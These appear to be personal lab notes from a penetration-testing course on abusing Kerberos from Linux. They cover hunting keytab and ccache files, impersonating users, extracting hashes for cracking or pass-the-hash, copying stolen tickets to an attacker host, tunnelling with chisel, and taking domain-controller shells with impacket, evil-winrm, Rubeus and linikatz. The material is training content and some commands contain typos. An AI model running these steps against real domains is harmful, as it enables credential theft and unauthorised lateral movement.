## Identify AD integration

We can identify if the Linux machine is domain-joined using [realm](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/windows_integration_guide/cmd-realmd),
In case [realm](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/windows_integration_guide/cmd-realmd) is not available, we can also look for other tools used to integrate Linux with Active Directory such as [sssd](https://sssd.io/) or [winbind](https://www.samba.org/samba/docs/current/man-html/winbindd.8.html).

```shell-session
$ realm list

$ps -ef | grep -i "winbind\|sssd"
```

![[Pasted image 20250626090110.png]]

Listing KeyTab file information

```shell-session
$ klist -k -t /opt/specialfiles/carlos.keytab

Keytab name: FILE:/opt/specialfiles/carlos.keytab
KVNO Timestamp           Principal
---- ------------------- ------------------------------------------------------
  1 10/06/2022 17:09:13 carlos@BLACKWOOD.HTB
```

## Finding KeyTab files

Kerberos tickets can be found in different places depending on the Linux implementation or the administrator changing default settings. Let's explore some common ways to find Kerberos tickets.

A straightforward approach is to use `find` to search for files whose name contains the word `keytab`.

```shell-session
$ find / -name *keytab* -ls 2>/dev/null
```

```shell-session
$ crontab -l
```

locating keytabs through scripts

```
# script accessing location of keytab
```

# Attacking Services/AD with Discovered kt files

To use a keytab file, we must have read and write (rw) privileges on the file.
Another way to find `KeyTab` files is in automated scripts configured using a cronjob or any other Linux service.

The ticket corresponds to the user Carlos. We can now impersonate the user with `kinit`. Let's confirm which ticket we are using with `klist` and then import Carlos's ticket into our session with `kinit`.
![[Pasted image 20250626091234.png]]
We can attempt to access the shared folder `\\dc01\carlos` to confirm our access.

```shell-session
$ smbclient //dc01/carlos -k -c ls
```

### Perserving current session while using others

To keep the ticket from the current session, before importing the keytab, save a copy of the ccache file present in the environment variable `KRB5CCNAME`.

# Adding keytab to session

add keytab to klist

```shell-session
$ kinit carlos@BLACKWOOD.HTB -k -t /opt/specialfiles/carlos.keytab
david@blackwood.com@linux01:~$ klist
Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu
```

### extracting hashes from keytab

extract hashes from keytab for cracking:

```shell-session
$ python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
```

With the NTLM hash, we can perform a Pass the Hash attack. With the AES256 or AES128 hash, we can forge our tickets using Rubeus or attempt to crack the hashes to obtain the plaintext password.

The most straightforward hash to crack is the NTLM hash. We can use tools like [Hashcat](https://hashcat.net/) or [John the Ripper](https://www.openwall.com/john/) to crack it. However, a quick way to decrypt passwords is with online repositories such as [https://crackstation.net/](https://crackstation.net/), which contains billions of passwords.

### Obtaining more hashes

redo enumeration process

```
carlos$ sudo -l
```

```shell-session
~# ls -la /tmp
```

#### Identifying group membership with the id command

```shell-session
uid=647401106(julio@blackwood.com) gid=647400513(domain users@blackwood.com)
```

using ccache files

```shell-session
oot@linux01:~# klist

klist: No credentials cache found (filename: /tmp/krb5cc_0)
```

copy ccache file and add to env

```
root@linux01:~# cp /tmp/krb5cc_647401106_I8I133 .
root@linux01:~# export KRB5CCNAME=/root/krb5cc_647401106_I8I133
```

confirm ccache is added

```
root@linux01:~# klist
Ticket cache: FILE:/root/krb5cc_647401106_I8I133
Default principal: julio@BLACKWOOD.HTB

Valid starting       Expires              Service principal
10/07/2022 13:25:01  10/07/2022 23:25:01  krbtgt/BLACKWOOD.HTB@BLACKWOOD.HTB
        renew until 10/08/2022 13:25:01
root@linux01:~# smbclient //dc01/C$ -k -c ls -no-pass
```

## finding ccache files

```shell-session
$ env | grep -i krb5
```

default, ccaches are stored at `/tmp`.

```shell-session
$ ls -la /tmp
```

## Using Linux attack tools with Kerberos

we need to ensure our `KRB5CCNAME` environment variable is set to the ccache file

In case we are attacking from a machine that is not a member of the domain, for example, our attack host, we need to make sure our machine can contact the KDC or Domain Controller, and that domain name resolution is working.
To use Kerberos, we need to proxy our traffic via `MS01` with a tool such as [Chisel](https://github.com/jpillora/chisel) and [Proxychains](https://github.com/haad/proxychains) and edit the `/etc/hosts`

```shell-session
$ cat /etc/hosts

# Host addresses

172.16.1.10 blackwood.com   Blackwood   dc01.blackwood.com  dc01
172.16.1.5  ms01.blackwood.com  ms01
```

We need to modify our proxychains configuration file to use socks5 and port 1080.

```shell-session
$ cat /etc/proxychains.conf

...SNIP...

[ProxyList]
socks5 127.0.0.1 1080
```

We must download and execute [chisel](https://github.com/jpillora/chisel) on our attack host.

```shell-session
$ wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
]$ gzip -d chisel_1.7.7_linux_amd64.gz
$ mv chisel_* chisel && chmod +x ./chisel
$ sudo ./chisel server --reverse
```

Connect to `MS01` via RDP and execute chisel (located in C:\Tools).

```shell-session
$ xfreerdp /v:10.129.204.23 /u:david /d:blackwood.com /p:Password2 /dynamic-resolution
```

```cmd-session
C:\htb> c:\tools\chisel.exe client 10.10.14.33:8080 R:socks
```

transfer CCACHE to attacker

```
scpy carlos@blackwood.com@ip:/tmp/ccache /home/hackthebox-labs/passwords_attacks/kerberos_linux
```

set env variable to ccache location

```shell-session
]$ export KRB5CCNAME=/home/vipa0z/krb5cc_647401106_I8I133
```

### Impacket

To use the Kerberos ticket, we need to specify our target machine name (not the IP address) and use the option `-k`. If we get a prompt for a password, we can also include the option `-no-pass`.

```shell-session
$ proxychains impacket-wmiexec dc01 -k
```

**Note:** If you are using Impacket tools from a Linux machine connected to the domain, note that some Linux Active Directory implementations use the FILE: prefix in the KRB5CCNAME variable. If this is the case, we need to modify the variable only to include the path to the ccache file.

### Evil-WinRM

we need a package called krb5user

```shell-session
$ sudo apt-get install krb5-user -y
```

![[Pasted image 20250626094411.png]]
In case the package `krb5-user` is already installed, we need to change the configuration file `/etc/krb5.conf` to include the following values:

#### Kerberos configuration file for BLACKWOOD.HTB

```shell-session
$ cat /etc/krb5.conf

[libdefaults]
        default_realm = BLACKWOOD.HTB

...SNIP...

[realms]
    BLACKWOOD.HTB = {
        kdc = dc01.blackwood.com
    }
```

using evilwinrm

```shell-session
$ proxychains evil-winrm -i dc01 -r blackwood.com
```

# convert ccache to windows ticket

If we want to use a `ccache file` in Windows or a `kirbi file` in a Linux machine, we can use [impacket-ticketConverter](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketConverter.py) to convert them. To use it, we specify the file we want to convert and the output filename. Let's convert Julio's ccache file to kirbi.

#### Impacket Ticket converter

```shell-session
$ impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
```

#### Importing converted ticket into Windows session with Rubeus

```cmd-session
C:\htb> C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
```

# linkatz

```shell-session
$ wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
$ /opt/linikatz.sh
Valid starting       Expires              Service principal
10/07/2022 11:32:01  10/07/2022 21:32:01  krbtgt/BLACKWOOD.HTB@BLACKWOOD.HTB
    renew until 10/08/2022 11:32:01, Flags: FPRIA
    Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types:
Ticket cache: FILE:/tmp/krb5cc_647401106_R9a9hG
Default principal: julio@BLACKWOOD.HTB

Valid starting       Expires              Service principal
10/10/2022 19:55:02  10/11/2022 05:55:02  krbtgt/BLACKWOOD.HTB@BLACKWOOD.HTB
    renew until 10/11/2022 19:55:02, Flags: FPRIA
    Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types:
Ticket cache: FILE:/tmp/krb5cc_647402606
Default principal: svc_workstations@BLACKWOOD.HTB

Valid starting       Expires              Service principal
10/10/2022 19:55:02  10/11/2022 05:55:02  krbtgt/BLACKWOOD.HTB@BLACKWOOD.HTB
    renew until 10/11/2022 19:55:02, Flags: FPRIA
    Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types:
I: [check] KCM Kerberos tickets
```
